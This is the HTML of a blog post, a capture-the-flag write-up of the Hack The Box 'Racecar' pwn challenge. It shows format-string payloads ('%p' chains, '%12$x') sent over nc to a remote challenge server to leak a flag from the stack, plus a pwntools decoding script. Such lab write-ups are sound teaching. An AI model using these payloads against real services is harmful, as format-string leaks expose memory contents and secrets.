@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en-us">
+<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="theme-color" content="#1b1b1b">
+	<title>Racecar HTB [ PWN ] | H4ns&#39; blog</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="Racecar HTB [ PWN ]" />
+<meta property="og:description" content="Before starting the vulnerability search, we must first perform a basic analysis.
+If we look at the strings of the executable and filter by the word &lsquo;flag&rsquo; we realize that there is a file called flag.txt which we assume is hidden.
+We are going to debug the executable with the IDA tool.
+Inside the car_menu function we have a file called flag.txt which will only be opened if the program flow enters car_menu:loc_FC." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://h4ns21.github.io/blog/post/racecar/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2022-02-27T18:39:55-05:00" />
+<meta property="article:modified_time" content="2022-02-27T18:39:55-05:00" />
+
+
+		<meta itemprop="name" content="Racecar HTB [ PWN ]">
+<meta itemprop="description" content="Before starting the vulnerability search, we must first perform a basic analysis.
+If we look at the strings of the executable and filter by the word &lsquo;flag&rsquo; we realize that there is a file called flag.txt which we assume is hidden.
+We are going to debug the executable with the IDA tool.
+Inside the car_menu function we have a file called flag.txt which will only be opened if the program flow enters car_menu:loc_FC."><meta itemprop="datePublished" content="2022-02-27T18:39:55-05:00" />
+<meta itemprop="dateModified" content="2022-02-27T18:39:55-05:00" />
+<meta itemprop="wordCount" content="350">
+<meta itemprop="keywords" content="" />
+		<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Racecar HTB [ PWN ]"/>
+<meta name="twitter:description" content="Before starting the vulnerability search, we must first perform a basic analysis.
+If we look at the strings of the executable and filter by the word &lsquo;flag&rsquo; we realize that there is a file called flag.txt which we assume is hidden.
+We are going to debug the executable with the IDA tool.
+Inside the car_menu function we have a file called flag.txt which will only be opened if the program flow enters car_menu:loc_FC."/>
+
+	<link rel="stylesheet" href="/blog/css/bundle.css">
+	<link rel="stylesheet" href="/blog/css/custom.css">
+	<link rel="stylesheet" href="/blog/css/themes/dark-blue.css">
+	<link rel="icon" href="/blog/icons/16.png" sizes="16x16" type="image/png">
+	<link rel="icon" href="/blog/icons/32.png" sizes="32x32" type="image/png">
+	<link rel="manifest" href="/blog/manifest.json">
+		
+</head>
+<body class="body kind-page">
+	<header class="header">
+	<a class="logo" href="/blog/">H4ns&#39; blog</a>
+	
+</header>
+	<div class="primary">
+	
+	<main class="main">
+		
+<nav class="breadcrumb block" aria-label="breadcrumb">
+	<ol class="breadcrumb__list">
+		
+		<li class="breadcrumb__item">
+			<a class="breadcrumbs__link" href="/blog/">Challs</a>
+		</li>
+		<li class="breadcrumb__item">
+			<a class="breadcrumbs__link" href="/blog/post/">Posts</a>
+		</li>
+		<li class="breadcrumbs__item breadcrumb__item--active" aria-current="page">Racecar HTB [ PWN ]</li>
+	</ol>
+</nav>
+		<div class="single block">
+			<article class="entry">
+	<div class="entry__meta meta mb">
+	<time class="entry__meta-published meta-published" datetime="2022-02-27T18:39:55-05:00">February 27, 2022</time>
+	</div>
+				<h1 class="entry__title">Racecar HTB [ PWN ]</h1>
+<details class="entry__toc toc" open>
+	<summary class="toc__title">Table of Contents</summary>
+	<nav id="TableOfContents"></nav>
+</details>
+				<div class="entry__content"><p>Before starting the vulnerability search, we must first perform a basic analysis.</p>
+<p><img src="https://user-images.githubusercontent.com/88755387/142025252-e61b2429-06f9-4464-94d7-e3cc8e7507e4.png" alt="image"></p>
+<p>If we look at the strings of the executable and filter by the word &lsquo;flag&rsquo; we realize that there is a file called flag.txt which we assume is hidden.</p>
+<p><img src="https://user-images.githubusercontent.com/88755387/142025391-0d68b387-fb14-46ab-948d-345e326b67a9.png" alt="image"></p>
+<p>We are going to debug the executable with the IDA tool.</p>
+<p><img src="https://user-images.githubusercontent.com/88755387/142025485-6ad74b6f-29cc-400c-83aa-9f21c3f19d26.png" alt="image"></p>
+<p>Inside the <code>car_menu</code> function we have a file called <code>flag.txt</code> which will only be opened if the program flow enters <code>car_menu:loc_FC</code>. We know this because at that function a call is made to the <code>_printf</code> function after &lsquo;winning the race&rsquo;.</p>
+<p>Let&rsquo;s see what address the <code>_printf</code> function has:</p>
+<p><img src="https://user-images.githubusercontent.com/88755387/142025864-4fa8907e-6335-42cc-a400-9be503ae2e00.png" alt="image"></p>
+<p>Before we continue we are going to create a file called &lsquo;flag.txt&rsquo; as the one the program is looking for to read in the same directory where we are going to run the binary.</p>
+<pre tabindex="0"><code>echo 'AAAA' &gt; flag.txt
+</code></pre><p>We run the binary in GDB and put a breakpoint in the vulnerable function <code>_printf</code>:</p>
+<p><img src="https://user-images.githubusercontent.com/88755387/142026049-dfe69c2f-3ba4-48e9-8677-7f32f91c4da7.png" alt="image"></p>
+<p>Now we run the binary and enter 40x <code>%p</code> to display more information:</p>
+<pre tabindex="0"><code>gdb-peda$ run
+Name: sth
+Nickname: sth
+&gt; 2
+&gt; 1
+&gt; 2
+&gt; %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+</code></pre><p><img src="https://user-images.githubusercontent.com/88755387/142026262-33deb92a-7566-47e2-a058-e2fd67259d86.png" alt="image"></p>
+<p>At the 12th position, there is a beginning of <code>flag.txt</code> — <code>AAAA</code> string which was input before. It seems like the flag is stored on the stack.</p>
+<p>Now we have to leak the flag from the remote service. We use <a href="https://kevinalmansa.github.io/application%20security/Format-Strings/">direct parameter access input format string</a> <code>%12$x</code> to leak <code>flag.txt</code> from a remote system.</p>
+<pre tabindex="0"><code>nc 104.248.169.123 31242
+[ ... ]
+&gt; %12$x
+</code></pre><p><img src="https://user-images.githubusercontent.com/88755387/142026727-f38db53b-bb06-40c0-8c19-4a4bdb7685b0.png" alt="image"></p>
+<p>If we convert them to ASCII we will find the beginning of the flag:</p>
+<pre tabindex="0"><code>7b425448 -&gt; {BTH
+4854427b -&gt; HTB{
+</code></pre><p>The next step is reversing the flag. As we know that the flag is between two &lsquo;{}&rsquo; we will look for the value of the closing brace in hexadecimal.</p>
+<pre tabindex="0"><code>{ -&gt; 7b
+} -&gt; 7d
+</code></pre><p>Now that we know its value we will reverse the bytes that are inside the braces.</p>
+<pre tabindex="0"><code>%x%x%x%x%x%x%x%x%x%x%x---FLAG: %p%p%p%p%p%p%p%p%p%p%p ---
+</code></pre><p><img src="https://user-images.githubusercontent.com/88755387/142026897-d3eb1187-6f89-4b88-9aeb-ad6c30199a56.png" alt="image"></p>
+<p>The last thing left is to create a script to view the flag in ASCII:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0x7b4254480x5f7968770x5f6431640x34735f310x745f33760x665f33680x5f67346c0x745f6e300x355f33680x6b6334740x7d213f&#39;</span>
+decoded_flag <span style="color:#f92672">=</span> []
+
+<span style="color:#66d9ef">for</span> element <span style="color:#f92672">in</span> flag<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;0x&#39;</span>)[<span style="color:#ae81ff">1</span>:]:
+ decoded_flag<span style="color:#f92672">.</span>append(p32(int(<span style="color:#e6db74">&#39;0x&#39;</span> <span style="color:#f92672">+</span> element,<span style="color:#ae81ff">16</span>)))
+ 
+print (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(decoded_flag))
+</code></pre></div><p><img src="https://user-images.githubusercontent.com/88755387/142027222-c9604f62-37df-4a97-996a-0b5eeb5d6241.png" alt="image"></p>
+</div>
+				
+				<footer class="entry__footer">
+					
+					
+<div class="entry__share share">
+	<a class="share__link btn" title="Share on Facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fh4ns21.github.io%2fblog%2fpost%2fracecar%2f" target="_blank" rel="noopener noreferrer" onclick="window.open(this.href, 'Share on Facebook', 'width=800,height=600,toolbar=0,status=0'); return false">
+		<svg class="share__icon" aria-label="Facebook" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M330 512V322h64l9-74h-73v-47c0-22 6-36 37-36h39V99c-7-1-30-3-57-3-57 0-95 34-95 98v54h-64v74h64v190z"/></svg>
+	</a>
+	<a class="share__link btn" title="Share on Twitter" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fh4ns21.github.io%2fblog%2fpost%2fracecar%2f&amp;text=Racecar%20HTB%20%5b%20PWN%20%5d" target="_blank" rel="noopener noreferrer" onclick="window.open(this.href, 'Share on Twitter', 'width=800,height=450,resizable=yes,toolbar=0,status=0'); return false">
+		<svg class="share__icon" aria-label="Twitter" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M437 152a72 72 0 0 1-40 12 72 72 0 0 0 32-40 72 72 0 0 1-45 17 72 72 0 0 0-122 65 200 200 0 0 1-145-74 72 72 0 0 0 22 94 72 72 0 0 1-32-7 72 72 0 0 0 56 69 72 72 0 0 1-32 1 72 72 0 0 0 67 50 200 200 0 0 1-105 29 200 200 0 0 0 309-179 200 200 0 0 0 35-37"/></svg>
+	</a>
+	<a class="share__link btn" title="Share on Reddit" href="https://www.reddit.com/submit?url=https%3a%2f%2fh4ns21.github.io%2fblog%2fpost%2fracecar%2f&amp;title=Racecar%20HTB%20%5b%20PWN%20%5d" target="_blank" rel="noopener noreferrer" onclick="window.open(this.href, 'Share on Reddit', 'width=832,height=624,toolbar=0,status=0'); return false">
+		<svg class="share__icon" aria-label="Reddit" role="img" width="32" height="32" viewBox="0 0 512 512"><path fill-rule="evenodd" d="M375 146a32 32 0 1 0-29-46l-65-13c-5-1-9 2-10 6l-22 97c-45 1-85 15-113 36a42 42 0 1 0-45 69l-1 12c0 65 74 117 166 117s166-52 166-117l-1-11a42 42 0 1 0-44-69c-28-21-67-35-111-37l19-86 58 13a32 32 0 0 0 32 29zM190 353c2-1 4 0 5 1 15 11 38 18 61 18s46-6 61-18a7 7 0 0 1 8 10c-18 14-44 21-69 21-25-1-51-7-69-21a6 6 0 0 1 3-11zm23-44a31 31 0 1 1-44-44 31 31 0 0 1 44 44zm130 0a31 31 0 1 0-44-44 31 31 0 0 0 44 44z"/></svg>
+	</a>
+	<a class="share__link btn" title="Share on Telegram" href="https://t.me/share/url?url=https%3a%2f%2fh4ns21.github.io%2fblog%2fpost%2fracecar%2f&amp;title=Racecar%20HTB%20%5b%20PWN%20%5d" target="_blank" rel="noopener noreferrer" onclick="window.open(this.href, 'Share on Telegram', 'width=800,height=600,toolbar=0,status=0'); return false">
+		<svg class="share__icon" aria-label="Telegram" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M199 404c-11 0-10-4-13-14l-32-105 245-144"/><path d="M199 404c7 0 11-4 16-8l45-43-56-34"/><path d="M204 319l135 99c14 9 26 4 30-14l55-258c5-22-9-32-24-25L79 245c-21 8-21 21-4 26l83 26 190-121c9-5 17-3 11 4"/></svg>
+	</a>
+	<a class="share__link btn" title="Share on LinkedIn" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fh4ns21.github.io%2fblog%2fpost%2fracecar%2f&title=Racecar%20HTB%20%5b%20PWN%20%5d" target="_blank" rel="noopener noreferrer" onclick="window.open(this.href, 'Share on LinkedIn', 'width=640,height=480,toolbar=0,status=0'); return false">
+		<svg class="share__icon" aria-label="LinkedIn" role="img" width="32" height="32" viewBox="0 0 512 512"><circle cx="142" cy="138" r="37"/><path stroke-width="66" d="M244 194v198M142 194v198"/><path d="M276 282c0-20 13-40 36-40 24 0 33 18 33 45v105h66V279c0-61-32-89-76-89-34 0-51 19-59 32"/></svg>
+	</a>
+</div>
+				</footer>
+				
+			</article>
+		</div>
+	</main>
+	
+<div class="authorbox block">
+	<div class="author">
+		<figure class="author__avatar">
+			<img class="author__img" alt="H4ns avatar" src="/blog/img/runa.jpg" height="90" width="90">
+		</figure>
+		<div class="author__body">
+			<div class="author__name">
+				H4ns
+			</div>
+			<div class="author__bio">I&#39;m a 19 years old cybersecurity enthusiast.</div>
+		</div>
+	</div>
+</div>
+	
+
+
+
+	
+
+	</div>
+	<footer class="footer">
+<div class="footer__social social">
+		<a class="social__link" target="_blank" rel="noopener noreferrer" href="mailto:alvaromansoporteiro@gmail.com">
+			<svg class="social__icon" aria-label="Email" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M299 268l124 106c-4 4-10 7-17 7H106c-7 0-13-3-17-7l124-106 43 38 43-38zm-43 13L89 138c4-4 10-7 17-7h300c7 0 13 3 17 7L256 281zm54-23l121-105v208L310 258zM81 153l121 105L81 361V153z"/></svg>
+		</a>
+		<a class="social__link" target="_blank" rel="noopener noreferrer" href="https://twitter.com/h4ns21">
+			<svg class="social__icon" aria-label="Twitter" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M437 152a72 72 0 0 1-40 12 72 72 0 0 0 32-40 72 72 0 0 1-45 17 72 72 0 0 0-122 65 200 200 0 0 1-145-74 72 72 0 0 0 22 94 72 72 0 0 1-32-7 72 72 0 0 0 56 69 72 72 0 0 1-32 1 72 72 0 0 0 67 50 200 200 0 0 1-105 29 200 200 0 0 0 309-179 200 200 0 0 0 35-37"/></svg>
+		</a>
+		<a class="social__link" target="_blank" rel="noopener noreferrer" href="https://www.instagram.com/alvarinhogz">
+			<svg class="social__icon" aria-label="Instagram" role="img" width="32" height="32" viewBox="0 0 512 512"><g fill="none" stroke-width="29"><rect height="296" rx="78" width="296" x="108" y="108"/><circle cx="256" cy="256" r="69"/></g><circle cx="343" cy="169" r="19"/></svg>
+		</a>
+		<a class="social__link" target="_blank" rel="noopener noreferrer" href="https://github.com/h4ns21">
+			<svg class="social__icon" aria-label="Github" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M335 499c14 0 12 17 12 17H165s-2-17 12-17c13 0 16-6 16-12l-1-50c-71 16-86-28-86-28-12-30-28-37-28-37-24-16 1-16 1-16 26 2 40 26 40 26 22 39 59 28 74 22 2-17 9-28 16-35-57-6-116-28-116-126 0-28 10-51 26-69-3-6-11-32 3-67 0 0 21-7 70 26 42-12 86-12 128 0 49-33 70-26 70-26 14 35 6 61 3 67 16 18 26 41 26 69 0 98-60 120-117 126 10 8 18 24 18 48l-1 70c0 6 3 12 16 12z"/></svg>
+		</a>
+</div>
+	<div class="footer__copyright">© 2022 H4ns. <span class="footer__copyright-credits">Powered by <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/vimux/binario" rel="nofollow noopener" target="_blank">Binario</a> theme.</span></div>
+</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML" async></script>
+
+<script src="/blog/js/custom.js"></script>
+</body>
+</html>
